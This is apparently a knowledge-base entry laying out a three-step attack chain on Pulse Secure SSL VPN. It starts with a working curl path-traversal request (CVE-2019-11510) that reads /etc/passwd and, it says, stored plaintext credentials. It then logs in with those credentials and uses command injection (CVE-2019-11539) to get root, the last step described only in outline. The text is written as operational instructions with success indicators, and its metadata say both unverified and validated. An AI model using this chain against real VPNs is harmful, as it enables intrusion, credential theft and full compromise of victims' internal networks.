---
id: ac-pulse-secure-chain-2019
tags:
  - pulse-secure
  - vpn
  - file-read
  - rce
  - command-injection
  - cve-2019-11510
  - cve-2019-11539
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Pre-Auth-Arbitrary-File-Read-in-Pulse-Secure-SSL-VPN]]'
  - '[[procedures/Authenticate-to-Pulse-Secure-SSL-VPN-Using-Stolen-Credentials]]'
  - >-
    [[procedures/Exploit-Post-Auth-Command-Injection-for-RCE-in-Pulse-Secure-SSL-VPN]]
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Credentials In Files]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:26:17.758Z'
description: >-
  Multi-stage attack exploiting CVE-2019-11510 for pre-auth file reading to
  steal credentials, followed by authentication and CVE-2019-11539 for root RCE
  in Pulse Secure SSL VPN.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Credentials In Files]]'
  - '[[Unix Shell]]'
---
# Pre-Auth Arbitrary File Read to Credential Theft and Post-Auth RCE in Pulse Secure SSL VPN

Multi-stage attack chain demonstrating exploitation of Pulse Secure SSL VPN vulnerabilities to achieve remote code execution as root, starting with pre-authentication file reading to steal credentials and progressing to post-auth command injection.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Pre-Auth File Read (CVE-2019-11510)] --> B[Credential Theft & Auth]
    B --> C[Post-Auth RCE (CVE-2019-11539)]
    C --> D[Intranet Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Pulse Secure SSL VPN instance vulnerable to CVE-2019-11510 and CVE-2019-11539
- Port 443 open
- Web-based VPN service

### Initial Access Requirements

- Network access to the VPN endpoint (e.g., https://target-vpn.com)
- No prior credentials needed for initial exploitation

## Detailed Attack Procedures

### Step 1: Pre-Auth File Reading
procedure: [[procedures/Exploit-Pre-Auth-Arbitrary-File-Read-in-Pulse-Secure-SSL-VPN]]

**Objective**: Exploit path traversal to read sensitive files like /etc/passwd and plaintext credentials stored by the VPN.

**Instructions**: Use [[commands/curl-path-traversal-file-read-pulse-secure]] to send a request exploiting the /dana-na/ endpoint:

```bash
curl -i -k --path-as-is https://target-vpn.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```

Adapt the path to target credential files, such as those in /var/pulse-secure/ for stored plaintext creds.

**Expected Output**: Contents of /etc/passwd or credential files, revealing usernames and potentially passwords.

**Success Indicators**:
- HTTP response includes file contents (e.g., user entries like root:x:0:0)
- No 404 or access denied errors

### Step 2: VPN Authentication
procedure: [[procedures/Authenticate-to-Pulse-Secure-SSL-VPN-Using-Stolen-Credentials]]

**Objective**: Use stolen credentials to gain authenticated access to the VPN.

**Instructions**: Log in via the web interface or API using the extracted username and password from Step 1. For example, navigate to the login portal at https://target-vpn.com/dana-na/auth/welcome.html and enter the creds.

**Expected Output**: Successful login redirect to the VPN dashboard or authenticated session.

**Success Indicators**:
- Access to post-auth endpoints
- Session cookies or tokens obtained

### Step 3: Post-Auth RCE
procedure: [[procedures/Exploit-Post-Auth-Command-Injection-for-RCE-in-Pulse-Secure-SSL-VPN]]

**Objective**: Inject commands in authenticated requests to execute arbitrary code as root, gaining intranet access.

**Instructions**: With an authenticated session, target a vulnerable post-auth endpoint (e.g., via diagnostic or config pages) to inject commands like `id` or `whoami` using curl or browser tools, exploiting CVE-2019-11539.

**Expected Output**: Command output in response, e.g., uid=0(root) confirming root access.

**Success Indicators**:
- Arbitrary command execution
- Access to internal network resources behind the VPN

## Attack Chain Summary

### Key Achievements

1. Pre-auth access to sensitive files without credentials
2. Credential theft enabling VPN authentication
3. Root-level RCE for full compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Credentials In Files]]
- [[Unix Shell]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Credential Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
